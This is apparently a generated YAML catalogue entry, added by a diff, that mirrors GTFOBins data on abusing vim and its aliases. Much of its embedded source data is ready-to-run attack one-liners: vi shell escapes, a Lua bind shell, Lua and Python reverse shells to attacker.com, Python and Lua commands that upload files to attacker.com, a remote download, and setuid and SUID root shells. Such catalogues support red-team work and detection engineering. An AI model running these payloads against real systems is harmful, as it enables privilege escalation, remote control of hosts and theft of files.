@@ -1,0 +1,323 @@
+id: gtfobins/vim/inherit/unprivileged
+type: binary
+platform: linux
+name: vim
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+aliases:
+- nvim
+- rview
+- rvim
+- view
+- vimdiff
+commands:
+- template: vim -c ':py ...'
+  comment: This allows to run Python code (`...`).
+- template: vim -c ':lua ...'
+  comment: This allows to run Lua code (`...`).
+- template: vim
+references:
+- https://gtfobins.github.io/gtfobins/vim/
+- https://gtfobins.github.io/gtfobins/nvim/
+- https://gtfobins.github.io/gtfobins/rview/
+- https://gtfobins.github.io/gtfobins/rvim/
+- https://gtfobins.github.io/gtfobins/view/
+- https://gtfobins.github.io/gtfobins/vimdiff/
+- https://gtfobins.github.io/gtfobins/lua/
+- https://gtfobins.github.io/gtfobins/python/
+- https://gtfobins.github.io/gtfobins/vi/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        nvim:
+          alias: vim
+        rview:
+          alias: view
+        rvim:
+          alias: vim
+        view:
+          alias: vim
+        vim:
+          functions:
+            file-read:
+            - binary: false
+              code: vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            inherit:
+            - code: vim -c ':py ...'
+              comment: This allows to run Python code (`...`).
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: python
+            - code: vim -c ':lua ...'
+              comment: This allows to run Lua code (`...`).
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: lua
+            - code: vim
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: vi
+        vimdiff:
+          alias: vim
+        lua:
+          functions:
+            bind-shell:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
+              comment: This requires `lua-socket` to be available.
+              connector: tcp-client
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            download:
+            - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n\
+                \  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"\
+                /path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-client
+            file-read:
+            - code: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"\
+                r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: lua -e 'os.execute("/bin/sh")'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            upload:
+            - code: "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"\
+                *a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"\
+                attacker.com\",12345);\n  t:send(d);\n  t:close();'"
+              comment: This requires `lua-socket` to be available.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+        python:
+          comment: The payloads are compatible with both Python version 2 and 3.
+          functions:
+            download:
+            - code: 'python -c ''import sys; from os import environ as e
+
+                if sys.version_info.major == 3: import urllib.request as r
+
+                else: import urllib as r
+
+                r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'''
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - code: python -c 'print(open("/path/to/input-file").read())'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: python -c 'open("/path/to/output-file","w+").write("DATA")'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            library-load:
+            - code: python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+              contexts:
+                capabilities:
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: 'python -c ''import sys,socket,os,pty;s=socket.socket()
+
+                s.connect(("attacker.com",12345))
+
+                [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+
+                pty.spawn("/bin/sh")'''
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              listener:
+                code: socat file:/dev/tty,raw,echo=0 tcp-listen:12345
+                comment: A TCP server with TTY support can be used on the attacker box to receive the
+                  shell.
+              tty: true
+            shell:
+            - code: python -c 'import os; os.execl("/bin/sh", "sh")'
+              contexts:
+                capabilities:
+                  code: python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+                  list:
+                  - CAP_SETUID
+                sudo: null
+                suid:
+                  code: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+                  shell: false
+                unprivileged: null
+            upload:
+            - code: 'python -c ''import sys
+
+                if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+
+                else: import urllib as u, urllib2 as r
+
+                r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'''
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-server
+            - code: 'python -c ''import sys
+
+                if sys.version_info.major == 3: import http.server as s, socketserver as ss
+
+                else: import SimpleHTTPServer as s, SocketServer as ss
+
+                ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'''
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: http-client
+        vi:
+          functions:
+            file-read:
+            - code: vi /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: 'vi /path/to/output-file
+
+                iDATA
+
+                ^[
+
+                w'
+              comment: Where `^[` is the escape key.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: vi -c ':!/bin/sh' /dev/null
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':shell'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':set shell=/bin/sh | shell'
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':set shell=/bin/sh\ -p | shell'
+                  shell: false
+                unprivileged: null
+            - code: vi -c :terminal /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':terminal /bin/sh -p'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/vim/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d39c40538d76e65bac31b5fe46f480a505992d00d87f084eb844c1f09effef4d
